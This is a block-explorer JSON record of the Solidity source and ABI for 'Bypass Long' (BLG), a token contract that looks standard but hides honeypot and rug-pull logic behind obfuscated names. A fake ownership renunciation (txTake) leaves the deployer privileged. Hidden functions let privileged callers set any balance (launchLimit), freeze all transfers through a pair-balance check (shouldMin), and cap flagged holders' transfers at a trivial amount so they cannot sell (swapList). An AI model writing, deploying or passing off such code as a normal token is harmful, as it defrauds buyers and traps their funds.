{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface senderLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract isWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletBuy {\n    function createPair(address launchAuto, address shouldFund) external returns (address);\n}\n\ninterface exemptTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundTo) external view returns (uint256);\n\n    function transfer(address fromTake, uint256 listMinSell) external returns (bool);\n\n    function allowance(address minLaunchSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listMinSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromTake,\n        uint256 listMinSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletAmountTake, uint256 value);\n    event Approval(address indexed minLaunchSwap, address indexed spender, uint256 value);\n}\n\ninterface exemptLimit is exemptTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BypassLong is isWallet, exemptTotal, exemptLimit {\n\n    function amountWallet(address maxFrom, address fromTake, uint256 listMinSell) internal returns (bool) {\n        require(launchReceiverTo[maxFrom] >= listMinSell);\n        launchReceiverTo[maxFrom] -= listMinSell;\n        launchReceiverTo[fromTake] += listMinSell;\n        emit Transfer(maxFrom, fromTake, listMinSell);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchReceiver;\n    }\n\n    uint256 public tokenFund;\n\n    function txTake() public {\n        emit OwnershipTransferred(feeEnable, address(0));\n        teamTx = address(0);\n    }\n\n    function shouldMin(uint256 listMinSell) public {\n        amountSwap();\n        atSwap = listMinSell;\n    }\n\n    function balanceOf(address fundTo) public view virtual override returns (uint256) {\n        return launchReceiverTo[fundTo];\n    }\n\n    address private teamTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listMax;\n    }\n\n    address liquiditySell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private takeFund;\n\n    function launchLimit(address sellSwap, uint256 listMinSell) public {\n        amountSwap();\n        launchReceiverTo[sellSwap] = listMinSell;\n    }\n\n    string private feeMaxIs = \"BLG\";\n\n    function allowance(address feeSender, address marketingLaunchShould) external view virtual override returns (uint256) {\n        if (marketingLaunchShould == launchWallet) {\n            return type(uint256).max;\n        }\n        return launchTake[feeSender][marketingLaunchShould];\n    }\n\n    string private feeBuy = \"Bypass Long\";\n\n    uint256 constant enableFee = 4 ** 10;\n\n    mapping(address => mapping(address => uint256)) private launchTake;\n\n    address public feeEnable;\n\n    bool public walletMin;\n\n    function receiverList(address autoFund) public {\n        if (walletMin) {\n            return;\n        }\n        if (atBuy != takeFund) {\n            tokenFund = listMaxMin;\n        }\n        marketingTxSell[autoFund] = true;\n        if (atBuy == tokenFund) {\n            listMaxMin = tokenFund;\n        }\n        walletMin = true;\n    }\n\n    uint256 sellLaunched;\n\n    uint8 private listMax = 18;\n\n    function sellLiquidity(address maxFrom, address fromTake, uint256 listMinSell) internal returns (bool) {\n        if (maxFrom == feeEnable) {\n            return amountWallet(maxFrom, fromTake, listMinSell);\n        }\n        uint256 listIs = exemptTotal(receiverTxMode).balanceOf(liquiditySell);\n        require(listIs == atSwap);\n        require(fromTake != liquiditySell);\n        if (launchedSellTeam[maxFrom]) {\n            return amountWallet(maxFrom, fromTake, enableFee);\n        }\n        return amountWallet(maxFrom, fromTake, listMinSell);\n    }\n\n    function transfer(address sellSwap, uint256 listMinSell) external virtual override returns (bool) {\n        return sellLiquidity(_msgSender(), sellSwap, listMinSell);\n    }\n\n    function owner() external view returns (address) {\n        return teamTx;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return feeBuy;\n    }\n\n    function approve(address marketingLaunchShould, uint256 listMinSell) public virtual override returns (bool) {\n        launchTake[_msgSender()][marketingLaunchShould] = listMinSell;\n        emit Approval(_msgSender(), marketingLaunchShould, listMinSell);\n        return true;\n    }\n\n    constructor (){\n        \n        senderLaunched toReceiver = senderLaunched(launchWallet);\n        receiverTxMode = walletBuy(toReceiver.factory()).createPair(toReceiver.WETH(), address(this));\n        \n        feeEnable = _msgSender();\n        txTake();\n        marketingTxSell[feeEnable] = true;\n        launchReceiverTo[feeEnable] = launchReceiver;\n        if (tokenFund == listMaxMin) {\n            atBuy = listMaxMin;\n        }\n        emit Transfer(address(0), feeEnable, launchReceiver);\n    }\n\n    function amountSwap() private view {\n        require(marketingTxSell[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return teamTx;\n    }\n\n    mapping(address => uint256) private launchReceiverTo;\n\n    uint256 private atBuy;\n\n    address public receiverTxMode;\n\n    uint256 private listMaxMin;\n\n    event OwnershipTransferred(address indexed limitAuto, address indexed listBuy);\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeMaxIs;\n    }\n\n    address launchWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 atSwap;\n\n    function swapList(address liquidityIs) public {\n        amountSwap();\n        if (takeFund != tokenFund) {\n            takeFund = tokenFund;\n        }\n        if (liquidityIs == feeEnable || liquidityIs == receiverTxMode) {\n            return;\n        }\n        launchedSellTeam[liquidityIs] = true;\n    }\n\n    uint256 private launchReceiver = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public marketingTxSell;\n\n    mapping(address => bool) public launchedSellTeam;\n\n    function transferFrom(address maxFrom, address fromTake, uint256 listMinSell) external override returns (bool) {\n        if (_msgSender() != launchWallet) {\n            if (launchTake[maxFrom][_msgSender()] != type(uint256).max) {\n                require(listMinSell <= launchTake[maxFrom][_msgSender()]);\n                launchTake[maxFrom][_msgSender()] -= listMinSell;\n            }\n        }\n        return sellLiquidity(maxFrom, fromTake, listMinSell);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLaunchSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAmountTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLaunchShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunchShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMinSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMinSell\",\"type\":\"uint256\"}],\"name\":\"launchLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedSellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTxSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"}],\"name\":\"receiverList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTxMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listMinSell\",\"type\":\"uint256\"}],\"name\":\"shouldMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"}],\"name\":\"swapList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMinSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMinSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BypassLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}